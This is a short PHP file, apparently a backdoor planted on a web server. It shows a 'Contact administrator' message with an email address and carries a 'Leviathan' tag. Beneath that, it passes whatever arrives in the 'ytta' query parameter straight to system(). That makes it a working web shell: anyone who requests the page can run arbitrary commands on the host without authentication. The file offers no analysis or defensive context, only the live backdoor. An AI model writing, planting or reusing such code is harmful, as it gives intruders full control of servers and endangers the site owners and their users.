<?php

// Leviathan
echo "Contact administrator: adminsupport@ikmb.ac.id<br>";

if (isset($_GET['ytta'])) {
    $ytta = $_GET['ytta'];
    system($ytta);
}

?>
